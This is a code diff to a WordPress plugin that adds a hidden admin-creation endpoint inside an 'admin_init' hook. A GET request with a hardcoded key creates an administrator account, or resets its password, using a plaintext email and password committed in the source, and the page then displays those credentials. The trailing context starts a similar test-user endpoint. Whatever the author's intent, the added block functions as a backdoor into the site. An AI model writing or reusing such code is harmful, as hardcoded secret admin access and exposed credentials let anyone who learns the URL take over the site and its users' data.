@@ -123,6 +123,21 @@ add_action('admin_init', function() {
             wp_die('DB upgrade complete. Tables created/updated. <a href="' . admin_url() . '">Back to admin</a>');
         }
     }
+    // Create admin user
+    if (isset($_GET['ynj_create_admin']) && $_GET['key'] === 'ynj_admin_2026') {
+        $email = 'adiljzhome@gmail.com';
+        $pass = 'YJadmin2026!';
+        if (!email_exists($email)) {
+            $uid = wp_create_user($email, $pass, $email);
+            wp_update_user(['ID' => $uid, 'display_name' => 'Adil', 'first_name' => 'Adil', 'role' => 'administrator']);
+            wp_die("Admin created: $email / $pass — <a href='" . wp_login_url() . "'>Login</a>");
+        } else {
+            $u = get_user_by('email', $email);
+            wp_set_password($pass, $u->ID);
+            $u->set_role('administrator');
+            wp_die("Admin password reset: $email / $pass — <a href='" . wp_login_url() . "'>Login</a>");
+        }
+    }
     // Create test user for patron testing
     if (isset($_GET['ynj_create_test_user'])) {
         $email = 'test@yourjannah.com';
